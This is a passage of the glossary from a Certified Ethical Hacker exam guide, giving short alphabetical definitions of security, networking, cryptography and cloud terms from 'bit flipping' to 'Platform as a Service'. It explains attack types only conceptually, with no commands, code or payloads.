
bit flipping A cryptographic attack where bits are manipulated in the cipher text to
generate a predictable outcome in the plain text once it is decrypted.

black hat An attacker who breaks into computer systems with malicious intent, with-
out the owner’s knowledge or permission.

black-box testing In penetration testing, a method of testing the security of a system
or subnet without any previous knowledge of the device or network. It is designed to
simulate an attack by an outside intruder (usually from the Internet).

block cipher A symmetric key cryptographic algorithm that transforms a block of
information at a time using a cryptographic key. For a block cipher algorithm, the length
of the input block is the same as the length of the output block.

Blowfish A symmetric, block-cipher data-encryption standard that uses a variable-
length key that can range from 32 bits to 448 bits.

BlueBorne attack An amalgamation of techniques and attacks against known, already
existing Bluetooth vulnerabilities.

Bluejacking Sending unsolicited messages over Bluetooth to Bluetooth-enabled
devices such as mobile phones, tablets, and laptop computers.

Bluesnarfing Unauthorized access to information such as calendars, contact lists,
e-mails, and text messages on a wireless device through a Bluetooth connection.

Bluetooth A proprietary, open, wireless technology used for transferring data from
fixed and mobile devices over short distances.

boot sector virus A virus that plants itself in a system’s boot sector and infects the
master boot record.

brute-force password attack A method of password cracking whereby all possible
options are systematically enumerated until a match is found. These attacks try every
password (or authentication option), one after another, until successful. Brute-force
attacks take a long time to work and are easily detectable.

buffer A portion of memory used to temporarily store output or input data.

buffer overflow A condition that occurs when more data is written to a buffer than
it has space to store, which results in data corruption or other system errors. This is usu-
ally because of insufficient bounds checking, a bug, or improper configuration in the
program code.

16-Glossary.indd 534 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Glossary

Glossary

535

bug A software or hardware defect that often results in system vulnerabilities.

business continuity plan (BCP) A set of plans and procedures to follow in the event
of a failure or a disaster—security related or not—to get business services back up and
running. BCPs include a disaster recovery plan (DRP) that addresses exactly what to do to
recover any lost data or services.

business impact analysis (BIA) An organized process to gauge the potential effects of an
interruption to critical business operations as a result of a disaster, accident, or emergency.

cache A storage buffer that transparently stores data so future requests for the same
data can be served faster.

CAM table Content addressable memory table. A CAM table holds all the MAC
address–to-port mappings on a switch.

certificate An electronic file used to verify a user’s identity, providing nonrepudiation
throughout the system. It is also known as a digital certificate. It is also a set of data that
uniquely identifies an entity. Certificates contain the entity’s public key, serial number,
version, subject, algorithm type, issuer, valid dates, and key usage details. See also digital
certificate.

certificate authority (CA) A trusted entity that issues and revokes public key certifi-
cates. In a network, a CA is a trusted entity that issues, manages, and revokes security
credentials and public keys for message encryption and/or authentication. Within a pub-
lic key infrastructure (PKI), the CA works with registration authorities (RAs) to verify
information provided by the requestor of a digital certificate.

Challenge Handshake Authentication Protocol (CHAP) An authentication method
on point-to-point links, using a three-way handshake and a mutually agreed-upon key.

CIA triad Confidentiality, integrity, and availability. These are the three fundamental
aspects of security.

cipher text Text or data in its encrypted form; the result of plain text being input into
a cryptographic algorithm.

client A computer process that requests a service from another computer and accepts
the server’s responses.

cloning A cell phone attack in which the serial number from one cell phone is copied
to another in an effort to copy the cell phone.

CNAME record A Canonical Name record within DNS, used to provide an alias for a
domain name.

cold site A backup facility with the electrical and physical components of a computer
facility, but with no computer equipment in place. The site is ready to receive the neces-
sary replacement computer equipment in the event the user has to move from his main
computing location to an alternate site.

16-Glossary.indd 535 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Glossary

CEH Certified Ethical Hacker All-in-One Exam Guide

536

collision In regard to hash algorithms, occurs when two or more distinct inputs pro-
duce the same output.

collision domain A domain composed of all the systems sharing any given physical
transport media. Systems within a collision domain may collide with each other during
the transmission of data. Collisions can be managed by Carrier Sense Multiple Access/
Collision Detection (CSMA/CD) or CSMA/Collision Avoidance (CSMA/CA).

Common Criteria (CC) An international standard (ISO/IEC 15408) for computer
security certification, providing a framework where computer system users can specify
their security functional and assurance requirements.

Common Internet File System/Server Message Block An Application layer protocol
used primarily by Microsoft Windows to provide shared access to printers, files, and serial
ports. It also provides an authenticated interprocess communication mechanism.

community cloud A cloud deployment model where the infrastructure is shared by
several organizations, usually with the same policy and compliance considerations.

community string A string used for authentication in Simple Network Management
Protocol (SNMP). The public community string is used for read-only searches, whereas
the private community string is used for read-write. Community strings are transmitted
in clear text in SNMPv1. SNMPv3 provides encryption for the strings as well as other
improvements and options.

competitive intelligence Freely and readily available information about an orga-
nization that can be gathered by a business entity about its competitor’s customers,
products, and marketing. It can be used by an attacker to build useful information for
further attacks.

Computer Emergency Response Team (CERT) Name given to expert groups that
handle computer security incidents.

computer-based attack A social engineering attack using computer resources such as
e-mail and IRC. Also known as computer-based social engineering attack.

confidentiality A security objective that ensures a resource can be accessed only by
authorized users. This is also the security principle that stipulates sensitive information is
not disclosed to unauthorized individuals, entities, or processes.

console port Physical socket provided on routers and switches for cable connections
between a computer and the router/switch. This connection enables the computer to
configure, query, and troubleshoot the router/switch by use of a terminal emulator and
a command-line interface.

container In cloud computing, a package of an application including all dependencies
that run independently of other processes in the cloud.

Container as a Service (CaaS) A cloud computing type providing container engine
services.

16-Glossary.indd 536 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Glossary

Glossary

537

contingency plan Management policies and procedures designed to maintain or
restore business operations, including computer operations, possibly at an alternate loca-
tion, in the event of an emergency, system failure, or disaster.

cookie A text file that is stored in a browser by a web server for the purpose of main-
taining information about the connection. Cookies are used to store information to
maintain a unique but consistent surfing experience but can also contain authentication
parameters. Cookies can be encrypted and can have defined expiration dates.

copyright A set of exclusive rights granted by the law of a jurisdiction to the author or
creator of an original work, including the right to copy, distribute, and adapt the work.

corrective controls Controls internal to a system that are designed to resolve vulner-
abilities and errors soon after they arise.

countermeasures Actions, devices, procedures, techniques, or other measures
intended to reduce the vulnerability of an information system.

covert channel A communications channel that is being used for a purpose it was not
intended for, usually to transfer information secretly.

cracker A cyberattacker who acts without permission from, and gives no prior notice
to, the resource owner. Also known as a malicious hacker.

crossover error rate (CER) A comparison metric for different biometric devices and
technologies, the CER is the point at which the false acceptance rate (FAR) equals the
false rejection rate (FRR). As an identification device becomes more sensitive or accurate,
its FAR decreases while its FRR increases. The CER is the point at which these two rates
are equal, or cross over.

cross-site scripting (XSS) An attack whereby the hacker injects code into an otherwise
legitimate web page, which is then clicked by other users or is exploited via Java or some
other script method. The embedded code within the link is submitted as part of the cli-
ent’s web request and can execute on the user’s computer.

crypter A software tool that uses a combination of encryption and code manipulation
to render malware undetectable to AV and other security-monitoring products.

cryptographic key A value used to control cryptographic operations, such as decryp-
tion, encryption, signature generation, and signature verification.

cryptography The science or study of protecting information, whether in transit or
at rest, by using techniques to render the information unusable to anyone who does not
possess the means to decrypt it.

daemon A background process found in Unix, Linux, Solaris, and other Unix-based
operating systems.

daisy chaining A method of external testing whereby several systems or resources are
used together to make an attack.

16-Glossary.indd 537 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Glossary

CEH Certified Ethical Hacker All-in-One Exam Guide

538

Data Encryption Standard (DES) An outdated symmetric cipher encryption algo-
rithm, previously approved by the U.S. government and used by business and civilian
government agencies. DES is no longer considered secure because of the ease with which
the entire keyspace can be attempted using modern computing, thus making cracking
the encryption easy.

Data Link layer Layer 2 of the OSI reference model. This layer provides reliable transit
of data across a physical link. The Data Link layer is concerned with physical addressing,
network topology, access to the network medium, error detection, sequential delivery of
frames, and flow control. The Data Link layer is composed of two sublayers: the MAC
and the LLC.

database An organized collection of data.

decryption The process of transforming cipher text into plain text through the use of
a cryptographic algorithm.

defense in depth An information assurance strategy in which multiple layers of
defense are placed throughout an information technology system.

demilitarized zone (DMZ) A partially protected zone on a network, not exposed to
the full fury of the Internet but not fully behind the firewall. This technique is typically
used on parts of the network that must remain open to the public (such as a web server)
but must also access trusted resources (such as a database). The point is to allow the
inside firewall component, guarding the trusted resources, to make certain assumptions
about the impossibility of outsiders forging DMZ addresses.

denial of service (DoS) An attack with the goal of preventing authorized users from
accessing services and preventing the normal operation of computers and networks.

detective controls Controls to detect anomalies or undesirable events occurring on
a system.

digital certificate Also known as a public key certificate, an electronic file that is used
to verify a user’s identity, providing nonrepudiation throughout the system. Certificates
contain the entity’s public key, serial number, version, subject, algorithm type, issuer,
valid dates, and key usage details.

digital signature The result of using a private key to encrypt a hash value for identi-
fication purposes within a PKI system. The signature can be decoded by the originator’s
public key, verifying his identity and providing nonrepudiation. A valid digital signature
gives a recipient verification the message was created by a known sender.

digital watermarking The process of embedding information into a digital signal in
a way that makes it difficult to remove.

directory traversal attack Using directory traversal, the attacker attempts to access
restricted directories and execute commands outside intended web server directories by
using the URL to redirect to an unintended folder location. Also known as the dot-dot-
slash attack.

16-Glossary.indd 538 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Glossary

Glossary

539

disaster recovery plan (DRP) A documented set of procedures to recover business
infrastructures in the event of a disaster.

discretionary access control (DAC) An access control model in which an individual
user, or program operating on the user’s behalf, is allowed to specify explicitly the types
of access other users (or programs executing on their behalf ) may have to information
under the user’s control.

distributed DoS (DDoS) A denial-of-service technique that uses numerous hosts to
perform the attack.

DNS enumeration The process of using easily accessible DNS records to map a target
network’s internal hosts.

domain name A unique hostname that is used to identify resources on the Internet.
Domain names start with a root (.) and then add a top level (.com, .gov, or .mil, for
example) and a given namespace.

Domain Name System (DNS) A network system of servers that translates numeric
Internet Protocol (IP) addresses into human-friendly, hierarchical Internet addresses, and
vice versa.

Domain Name System (DNS) cache poisoning An attack technique that tricks your
DNS server into believing it has received authentic information when, in reality, it has
been provided fraudulent data. DNS cache poisoning affects user traffic by sending it to
erroneous or malicious endpoints instead of its intended destination.

Domain Name System (DNS) lookup The process of a system providing a fully quali-
fied domain name (FQDN) to a local name server, for resolution to its corresponding
IP address.

doxing The process of searching for and publishing private information about a target
(usually an individual) on the Internet, typically with malicious intent.

dropper Malware designed to install some sort of virus, back door, and so on, on a
target system.

due care A term representing the responsibility managers and their organizations have
to provide information security to ensure the type of control, the cost of control, and the
deployment of control are appropriate for the system being managed.

due diligence Steps taken to identify and limit risks to an acceptable or reasonable
level of exposure.

dumpster diving A physical security attack where the attacker sifts through garbage
and recycle bins for information that may be useful on current and future attacks.

eavesdropping The act of secretly listening to the private conversations of others
without their consent. This can also be done over telephone lines (wiretapping), e-mail,
instant messaging, and other methods of communication considered private.

16-Glossary.indd 539 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Glossary

CEH Certified Ethical Hacker All-in-One Exam Guide

540

Echo Reply A type 0, code 0 ICMP message used to reply to Echo Requests. It is used
with ping to verify Network layer connectivity between hosts.

Echo Request A type 8, code 0 ICMP message used to request replies for a distant end.
It is used with ping to verify Network layer connectivity between hosts.

EDGAR database A system used by the U.S. Securities and Exchange Commission
(SEC) for companies and businesses to transmit required filings and information. The
EDGAR database performs automated collection, validation, indexing, acceptance, and
forwarding of submissions by companies and others who are required by law to file
forms with the SEC. The database is freely available to the public via the Internet and is
a potential source of information for hackers.

Electronic Code Book (ECB) A mode of operation for a block cipher, with the char-
acteristic that each possible block of plain text has a defined corresponding cipher-text
value, and vice versa.

electronic serial number Created by the U.S. Federal Communications Commission
(FCC) to uniquely identify mobile devices; often represented as an 11-digit decimal
number or 8-digit hexadecimal number.

Encapsulating Security Payload (ESP) Part of the Internet Protocol Security (IPSec)
set of protocols, ESP encrypts and authenticates packets between computers using a vir-
tual rrivate network (VPN).

encapsulation The process of attaching a particular protocol header and trailer to a
unit of data before transmission on the network. It occurs at Layer 2 (Data Link) of the
OSI reference model.

encryption Conversion of plain text to cipher text through the use of a cryptographic
algorithm.

end user licensing agreement (EULA) A software license agreement; a contract
between the “licensor” and purchaser establishing the right to use the software.

Enterprise Information Security Architecture (EISA) A collection of requirements
and processes that helps determine how an organization’s information systems are built
and how they work.

enumeration In penetration testing, the act of querying a device or network segment
thoroughly and systematically for information.

Ethernet IEEE 802.3 baseband LAN specification developed by Xerox Corporation,
Intel, and Digital Equipment Corporation. This is one of the least expensive, most widely
deployed networking standards; it uses the CSMA/CD method of media access control.

ethical hacker A computer security expert who performs security audits and penetra-
tion tests against systems or network segments, with the owner’s full knowledge and
permission, in an effort to increase security.

16-Glossary.indd 540 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Glossary

Glossary

541

event Any network incident that prompts some kind of log entry or other notification.

exploit Software code, a portion of data, or a sequence of commands intended to take
advantage of a bug or vulnerability in order to cause unintended or unanticipated behav-
ior to occur on computer software or hardware.

exposure factor (EF) The subjective, potential percentage of loss to a specific asset if a
specific threat is realized. The exposure factor is a subjective value that the person assess-
ing risk must define.

Extensible Authentication Protocol (EAP) A protocol for authentication used within
wireless networks. Originally an extension of PPP, EAP works with multiple authentica-
tion measures.

false acceptance rate (FAR) The rate at which a biometric system will incorrectly
identify an unauthorized individual and allow them access. See false negative.

false negative A situation in which an IDS or other sensor does not trigger on an
event that was an intrusion attempt. False negatives are considered more dangerous than
false positives.

false positive A situation in which an IDS or other sensor triggers on an event as an
intrusion attempt, when it was actually legitimate traffic.

false rejection rate (FRR) The rate at which a biometric system will incorrectly reject
an access attempt by an authorized user.

Fast Ethernet An Ethernet networking system transmitting data at 100 million bits
per second (Mbps), ten times the speed of an earlier Ethernet standard. Derived from the
Ethernet 802.3 standard, it is also known as 100BaseT.

Fiber Distributed Data Interface (FDDI) LAN standard, defined by ANSI X3T9.5,
specifying a 100-Mbps token-passing network using fiber-optic cable and a dual-ring
architecture for redundancy, with transmission distances of up to 2 kilometers.

File Allocation Table (FAT) A computer file system architecture used in Windows,
OS/2, and most memory cards, limited to a 32GB partition size.

File Transfer Protocol (FTP) An Application layer protocol, using TCP, for transport-
ing files across an Internet connection. FTP transmits in clear text.

filter A set of rules defined to screen network packets based on source address, destina-
tion address, or protocol. These rules determine whether the packet will be forwarded
or discarded.

Finger An early network application that provides information on users currently
logged on to a machine.

firewalking The process of systematically testing each port on a firewall to map rules
and determine accessible ports.

16-Glossary.indd 541 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Glossary

CEH Certified Ethical Hacker All-in-One Exam Guide

542

firewall Software or hardware component that restricts access between a protected
network and the Internet, or between other sets of networks, to block unwanted use
or attacks.

flood Traffic-passing technique used by bridges and switches in which traffic received
on an interface is sent out all interfaces on the device except the interface on which the
information was originally received. Traffic on a switch is flooded when it is broadcast in
nature (intended for a broadcast address, as with ARP or other protocols) or if the switch
does not have an entry in the CAM table for the destination MAC.

footprinting All measures and techniques taken to gather information about an
intended target. Footprinting can be passive or active.

forwarding The process of sending a packet or frame toward the destination. In a
switch, messages are forwarded only to the port to which they are addressed.

fragmentation Process of breaking a packet into smaller units when it is being trans-
mitted over a network medium that’s unable to support a transmission unit the original
size of the packet.

FreeBSD A free and popular version of the Unix operating system.

fully qualified domain name (FQDN) Consists of a hostname and domain name,
including a top-level domain such as .com, .net, .mil, .edu, and so on.

Function as a Service (FaaS) A cloud computing type that provides a platform for
developing application functions for microservices.

gap analysis A tool that helps a company compare its actual performance with its
potential performance.

gateway A device that provides access between two or more networks. Gateways are
typically used to connect dissimilar networks.

GET A command used in HTTP and FTP to retrieve a file from a server.

government access to keys (GAK) An attempt through key disclosure laws to have
software companies provide copies of all keys to the government, which (ostensibly)
will use the keys only when a warrant is provided during law enforcement efforts. Also
referred to as key escrow.

gray hat A skilled hacker who straddles the line between white hat (hacking only with
permission and within guidelines) and black hat (malicious hacking for personal gain).
Gray hats sometime perform illegal acts to exploit technology with the intent of achiev-
ing better security.

gray-box testing A penetration test in which the ethical hacker has limited knowledge
of the intended target(s). Designed to simulate an internal but non-system-administrator-
level attack.

16-Glossary.indd 542 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Glossary

Glossary

543

hack value The idea a hacker holds about the perceived worth or interest in attacking
a target.

hacktivism The act or actions of a hacker to put forward a cause or a political agenda,
to affect some societal change, or to shed light on something the hacker feels to be a
political injustice. These activities are usually illegal in nature.

halo effect A well-known and well-studied phenomenon of human nature, whereby a
single trait influences the perception of other traits.

hardware keystroke logger A hardware device used to log keystrokes covertly.
Hardware keystroke loggers are dangerous because they cannot be detected through reg-
ular software/anti-malware scanning.

hash A unique numerical string, created by a hashing algorithm on a given piece of
data, used to verify data integrity. Generally hashes are used to verify the integrity of files
after download (comparison to the hash value on the site before download) and/or to
store password values.

hashing algorithm A one-way mathematical function that generates a fixed-length
numerical string (hash) from a given data input. MD5 and SHA-1 are hashing algorithms.

heuristic scanning Method used by antivirus software to detect new, unknown viruses
that have not yet been identified. Based on a piece-by-piece examination of a program,
heuristic scanning looks for a sequence (or sequences) of instructions that differentiates
the virus from “normal” programs.

Hierarchical File System (HFS) A file system used by macOS.

honeynet A network deployed as a trap to detect, deflect, or deter unauthorized use
of information systems.

honeypot A host designed to collect data on suspicious activity.

host-based intrusion detection system (HIDS) An IDS that resides on the host, pro-
tecting against file and folder manipulation and other host-based attacks and actions.

hot site A fully operational offsite data-processing facility equipped with hardware and
system software to be used in the event of a disaster.

HTTP tunneling A firewall-evasion technique whereby packets are wrapped in HTTP,
as a covert channel to the target.

human-based social engineering Using conversation or some other interaction
between people to gather useful information.

hybrid attack An attack that combines a brute-force attack with a dictionary attack.

hybrid cloud A cloud model that is a composite of two or more cloud deployment
models (public, private, or community).

16-Glossary.indd 543 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Glossary

CEH Certified Ethical Hacker All-in-One Exam Guide

544

Hypertext Transfer Protocol (HTTP) A communications protocol used for browsing
the Internet.

Hypertext Transfer Protocol Secure (HTTPS) A hybrid of the HTTP and SSL/TLS
protocols that provides encrypted communication and secure identification of a web server.

identity and Access Management (IAM) A framework of policies, procedures, and
technologies for granting and ensuring appropriate access to resources for appropriate
users.

Identity as a Service (IDaaS) A cloud computing type providing IAM services.

identity theft A form of fraud in which someone pretends to be someone else by
assuming that person’s identity, typically to access resources or obtain credit and other
benefits in that person’s name.

impersonation A social engineering effort in which the attacker pretends to be an
employee, a valid user, or even an executive to elicit information or access.

inference attack An attack in which the hacker can derive information from the
cipher text without actually decoding it. Sensitive information can be considered com-
promised if an adversary can infer its real value with a high level of confidence.

information technology (IT) asset criticality The level of importance assigned to an
IT asset.

information technology (IT) asset valuation The monetary value assigned to an
IT asset.

information technology (IT) infrastructure The combination of all IT assets,
resources, components, and systems.

information technology (IT) security architecture and framework A document
describing information security guidelines, policies, procedures, and standards.

Information Technology Security Evaluation Criteria (ITSEC) A structured set
of criteria for evaluating computer security within products and systems produced by
European countries; it has been largely replaced by the Common Criteria.

Infrastructure as a Service (IaaS) A cloud computing type providing virtualized com-
puting resources over the Internet.

infrastructure mode A wireless networking mode where all clients connect to the
wireless network through a central access point.

initial sequence number (ISN) A number assigned during TCP startup sessions that
tracks how much information has been moved. This number is used by hackers when
hijacking sessions.

insider affiliate A spouse, friend, or client of an employee who uses the employee’s
credentials to gain physical or logical access to organizational resources.

16-Glossary.indd 544 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Glossary

Glossary

545

insider associate A person with limited authorized access to the organization; con-
tractors, guards, and cleaning services are all examples.

Institute of Electrical and Electronics Engineers (IEEE) An organization composed
of engineers, scientists, and students that issues standards related to electrical, electronic,
and computer engineering.

integrity The security property that data is not modified in an unauthorized and
undetected manner. Also, this is the principle of taking measures to ensure that data
received is in the same condition and state as when it was originally transmitted.

Interior Gateway Protocol (IGP) An Internet routing protocol used to exchange rout-
ing information within an autonomous system.

International Organization for Standardization (ISO) An international organiza-
tion composed of national standards bodies from more than 75 countries. ISO developed
the Open System Interconnection (OSI) reference model.

Internet Assigned Number Authority (IANA) The organization that governs the
Internet’s top-level domains, IP address allocation, and port number assignments.

Internet Control Message Protocol (ICMP) A protocol used to pass control and error
messages between nodes on the Internet.

Internet of Things (IoT) The collection of devices using sensors, software, storage, and
electronics to collect, analyze, store, and share data among themselves or to a user, with
or without human intervention or action.

Internet Protocol (IP) A protocol for transporting data packets across a packet-
switched internetwork (such as the Internet). IP is a routed protocol.

Internet Protocol Security (IPSec) architecture A suite of protocols used for secur-
ing Internet Protocol (IP) communications by authenticating and encrypting each
IP packet of a communication session. This suite includes protocols for establishing
mutual authentication between agents at session establishment and for negotiating the
cryptographic keys to be used throughout the session.

Internet service provider (ISP) A business, government agency, or educational insti-
tution that provides access to the Internet.

intranet A self-contained network with a limited number of participants who extend
limited trust to one another in order to accomplish an agreed-upon goal.

intrusion detection system (IDS) A security tool designed to protect a system or net-
work against attacks by comparing traffic patterns against a list of both known attack
signatures and general characteristics of how attacks may be carried out. Threats are rated
and reported.

intrusion prevention system (IPS) A security tool designed to protect a system or
network against attacks by comparing traffic patterns against a list of both known attack
signatures and general characteristics of how attacks may be carried out. Threats are rated
and reported, with protective measures taken to prevent the more significant threats.

16-Glossary.indd 545 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Glossary

CEH Certified Ethical Hacker All-in-One Exam Guide

546

IoT gateway A device designed to send collected data from IoT devices to the user or
to data storage (the cloud) for use later.

iris scanner A biometric device that uses pattern-recognition techniques based on
images of the irises of an individual’s eyes.

ISO/IEC 27001 A standard that provides best-practice recommendations on informa-
tion security management for use by those responsible for initiating, implementing, or
maintaining Information Security Management Systems (ISMS). Information security is
defined within the standard in the context of the CIA triad.

Kerberos A widely used authentication protocol developed at the Massachusetts
Institute of Technology (MIT). Kerberos authentication uses tickets (known as Ticket
Granting Tickets, TGT ), a Ticket Granting Service (TGS), and a Key Distribution
Center (KDC).

key exchange protocol A method in cryptography by which cryptographic keys are
exchanged between users, thus allowing use of a cryptographic algorithm (for example,
the Diffie-Hellman key exchange).

keylogger A software application or hardware device that captures user keystrokes.

last in, first out (LIFO) A programming principle whereby the last piece of data added
to the stack is the first piece of data taken off.

Lightweight Directory Access Protocol (LDAP) An industry-standard protocol used
for accessing and managing information within a directory service; an application proto-
col for querying and modifying data using directory services running over TCP/IP.

limitation of liability and remedies A legal limit on the amount of financial liability
and remedies the organization is responsible for taking on.

local area network (LAN) A computer network confined to a relatively small area,
such as a single building or campus.

logic bomb A piece of code intentionally inserted into a software system that will
perform a malicious function when specified conditions are met at some future point.

MAC filtering A method of permitting only MAC addresses in a preapproved list of
network access. Addresses not matching are blocked.

macro virus A virus written in a macro language and usually embedded in document
or spreadsheet files.

malicious code Software or firmware intended to perform an unauthorized pro-
cess that will have an adverse impact on the confidentiality, integrity, or availability of
an information system. A virus, worm, Trojan horse, or other code-based entity that
infects a host.

16-Glossary.indd 546 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Glossary

Glossary

547

malware A program or piece of code inserted into a system, usually covertly, with the
intent of compromising the confidentiality, integrity, or availability of the victim’s data,
applications, or operating system. Malware consists of viruses, worms, and other mali-
cious code.

mandatory access control (MAC) An access control model in which access to system
resources is restricted based on the sensitivity (as represented by a label) of the informa-
tion contained in the system resource and the formal authorization (that is, clearance) of
users to access information of such sensitivity.

man-in-the-middle attack An attack where the hacker positions himself between the
client and the server to intercept (and sometimes alter) data traveling between the two.

mantrap Also known as an access control vestibule, a small space having two sets of
interlocking doors; the first set of doors must close before the second set opens. Typically
authentication is required for each door, often using different factors. For example, a
smartcard may open the first door, and a personal identification number entered on a
number pad opens the second.

master boot record infector A virus designed to infect the master boot record.

maximum tolerable downtime (MTD) A measurement of the potential cost due to
a particular asset being unavailable, used as a means to prioritize the recovery of assets
should the worst occur.

MD5 A hashing algorithm that results in a 128-bit output.

Media Access Control (MAC) A sublayer of Layer 2 of the OSI model, the Data Link
layer. It provides addressing and channel access control mechanisms that enable several
terminals or network nodes to communicate within a multipoint network.

methodology A documented process for a procedure designed to be consistent,
repeatable, and accountable.

microservices Cloud hosted sub-applications that perform tasks individually but
work together for specific functions.

multipartite virus A computer virus that infects and spreads in multiple ways.

Multipurpose Internet Mail Extensions (MIME) An extensible mechanism for e-mail.
A variety of MIME types exist for sending content such as audio, binary, or video using
the Simple Mail Transfer Protocol (SMTP).

NetBSD A free, open source version of the Berkeley Software Distribution of Unix,
often used in embedded systems.

NetBus A software program for remotely controlling a Microsoft Windows computer
system over a network. Generally it is considered malware.

16-Glossary.indd 547 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Glossary

CEH Certified Ethical Hacker All-in-One Exam Guide

548

network access server A device providing temporary, on-demand, point-to-point net-
work access to users.

network address translation (NAT) A technology where you advertise one IP address
externally and data packets are rerouted to the appropriate IP address inside your net-
work by a device providing translation services. In this way, IP addresses of machines on
your internal network are hidden from external users.

Network Basic Input/Output System (NetBIOS) An API that provides services related
to the OSI model’s Session layer, allowing applications on separate computers to com-
municate over a LAN.

network interface card (NIC) An adapter that provides the physical connection to
send and receive data between the computer and the network media.

Network layer Layer 3 of the OSI reference model. This layer is where routing occurs.

network operations center (NOC) One or more locations from which control is exer-
cised over a computer, television broadcast, or telecommunications network.

network tap Any kind of connection that allows you to see all traffic passing by.
Generally used in reference to a network-based IDS (NIDS) to monitor all traffic.

network-based intrusion detection system (NIDS) An intrusion detection system,
generally passive in nature, that monitors network traffic.

Nmap An open source scanning utility used to discover hosts and services on a network.

node A device on a network.

nonrepudiation The means by which a recipient of a message can ensure the identity
of the sender and neither party can deny having sent or received the message. The most
common method is through digital certificates.

NOP A command that instructs the system processor to do nothing. Many overflow
attacks involve stringing several NOP operations together (known as a NOP sled ).

nslookup A network administration command-line tool available for many operat-
ing systems for querying the Domain Name System (DNS) to obtain domain name or
IP address mappings or any other specific DNS record.

NT LAN Manager (NTLM) The default network authentication suite of protocols for
Windows NT 4.0—retained in later versions for backward compatibility. NTLM is con-
sidered insecure and was replaced by NTLMv2.

null session An anonymous connection to an administrative share (IPC$) on a
Windows machine. Null sessions allow for enumeration of Windows machines, among
other attacks.

open source Describes practices in production and development that promote access
to the end product’s source materials.

16-Glossary.indd 548 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Glossary

Glossary

549

Open Source Security Testing Methodology Manual (OSSTMM) A peer-reviewed,
formalized methodology of security testing and analysis.

Open Systems Interconnection (OSI) reference model A network architecture
framework developed by ISO that describes the communications process between two
systems across the Internet in seven distinct layers.

OpenBSD A Unix-like computer operating system descending from the Berkeley
Software Distribution (BSD). OpenBSD includes a number of security features absent or
optional in other operating systems.

operating system attack An attack that exploits the common mistake many people
make when installing operating systems—that is, accepting and leaving all the defaults.

operational technology (OT) Software and hardware designed to monitor, detect,
and cause changes to industrial operations.

out-of-band signaling Transmission using channels or frequencies outside those nor-
mally used for data transfer; often used for error reporting.

outsider associate A untrusted outsider using open, or illicitly gained, access to an
organization’s resources.

overt channel A communications path, such as the Internet, authorized for data
transmission within a computer system or network.

packer A crypter that uses compression to pack malware executables into smaller sizes
to avoid detection.

packet A unit of information formatted according to specific protocols, generally
regarded as being used in OSI Layer 3, that allows precise transmittal of data from one
network node to another. Also called a datagram (UDP) or data packet, a packet contains
a header (container) and a payload (contents). Any IP message larger than 1500 bytes
will be fragmented into packets for transmission.

packet filtering Controlling access to a network by analyzing the headers of incoming
and outgoing packets and letting them pass or discarding them based on rule sets created
by a network administrator. A packet filter allows or denies packets based on destination,
source, and/or port.

Packet Internet Groper (ping) A utility that sends an ICMP Echo message to deter-
mine whether a specific IP address is accessible; if the message receives a reply, the address
is reachable.

parameter tampering An attack where the hacker manipulates parameters within the
URL string in hopes of modifying data.

passive attack An attack against an authentication protocol in which the attacker
intercepts data in transit along the network between the claimant and verifier but does
not alter the data (in other words, eavesdropping).

16-Glossary.indd 549 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Glossary

CEH Certified Ethical Hacker All-in-One Exam Guide

550

Password Authentication Protocol (PAP) A simple PPP authentication mechanism
in which the user name and password are transmitted in clear text to prove identity. PAP
compares the user name and password to a table listing authorized users.

patch A piece of software, provided by the vendor, intended to update or fix known,
discovered problems in a computer program or its supporting data.

pattern matching The act of checking some sequence of tokens for the presence of
the constituents of some pattern.

payload The contents of a packet or specific malicious content an attacker delivers
that is acted upon and executed by the system. A system attack requires the attacker to
deliver a malicious payload that is acted upon and executed by the system.

Payment Card Industry Data Security Standard (PCI DSS) A security standard for
organizations handling credit cards, ATM, and other point-of-sales cards. The standard
applies to all groups and organizations involved in the entirety of the payment process—
from card issuers to merchants to those storing and transmitting card information—and
consist of 12 requirements.

penetration testing A method of evaluating the security of a computer system or
network by simulating an attack from a malicious source.

personal identification number (PIN) A secret, typically consisting of only decimal
digits, that a claimant memorizes and uses to authenticate his identity.

phishing A social engineering attack whereby the attacker crafts an e-mail—usually
with a bogus link for the user to click—and sends it to folks inside the target organiza-
tion .

Physical layer Layer 1 of the OSI reference model. All physical concerns, such as
media, connector types, etc., reside here.

physical security Security measures, such as a locked door, perimeter fence, or secu-
rity guard, to prevent or deter physical access to a facility, resource, or information stored
on physical media.

piggybacking When an authorized person allows (intentionally or unintentionally)
someone to pass through a secure door, despite the intruder not having a badge.

ping sweep The process of pinging each address within a subnet to map potential
targets. Ping sweeps are unreliable and easily detectable but very fast.

Platform as a Service (PaaS) A cloud computing type geared toward software develop-
ment, providing a platform that allows subscribers to develop applications without build-
ing the infrastructure that normally would be required to develop and launch software.

